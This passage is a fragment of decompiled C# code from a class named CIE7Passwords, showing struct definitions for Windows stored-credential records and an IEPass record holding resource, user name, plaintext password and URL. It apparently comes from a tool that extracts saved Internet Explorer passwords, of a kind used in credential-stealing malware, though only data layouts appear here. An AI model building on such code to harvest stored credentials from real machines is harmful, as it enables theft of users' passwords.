			public int dwType;

			// Token: 0x040000CE RID: 206
			public IntPtr lpstrTargetName;

			// Token: 0x040000CF RID: 207
			public IntPtr lpstrComment;

			// Token: 0x040000D0 RID: 208
			public CIE7Passwords.FILETIME ftLastWritten;

			// Token: 0x040000D1 RID: 209
			public int dwCredentialBlobSize;

			// Token: 0x040000D2 RID: 210
			public IntPtr lpbCredentialBlob;

			// Token: 0x040000D3 RID: 211
			public int dwPersist;

			// Token: 0x040000D4 RID: 212
			public int dwAttributeCount;

			// Token: 0x040000D5 RID: 213
			public IntPtr lpAttributes;

			// Token: 0x040000D6 RID: 214
			public IntPtr lpstrTargetAlias;

			// Token: 0x040000D7 RID: 215
			public IntPtr lpUserName;
		}

		// Token: 0x0200001B RID: 27
		private struct IEPass
		{
			// Token: 0x040000D8 RID: 216
			public int dwType;

			// Token: 0x040000D9 RID: 217
			public string strResource;

			// Token: 0x040000DA RID: 218
			public string strUserName;

			// Token: 0x040000DB RID: 219
			public string strPassword;

			// Token: 0x040000DC RID: 220
			public string strURL;

			// Token: 0x040000DD RID: 221
			public string strDescription;

			// Token: 0x040000DE RID: 222
			public DateTime ftAddDate;
		}
	}
}
